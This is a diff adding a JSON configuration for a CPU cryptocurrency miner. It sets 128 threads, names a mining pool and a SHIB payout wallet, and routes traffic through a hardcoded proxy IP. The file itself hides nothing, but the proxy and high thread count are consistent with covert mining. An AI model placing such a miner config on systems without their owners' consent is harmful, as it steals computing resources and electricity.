@@ -1,0 +1,24 @@
+{
+  "hardwareConfiguration": {
+    "cpu": {
+      "enabled": true,
+      "optimizationMethod": "Auto",
+      "threadCount": 128
+    }
+  },
+  "pools": [
+    {
+      "agent": "",
+      "algorithm": "wrkzcoin",
+      "host": "rx.unmineable.com",
+      "niceHash": true,
+      "password": "x",
+      "port": 3333,
+      "ssl": false,
+      "priority": 0,
+      "rigID": "CPU",
+      "username": "SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836",
+      "proxy": "72.210.252.134:46164"
+    }
+  ]
+}
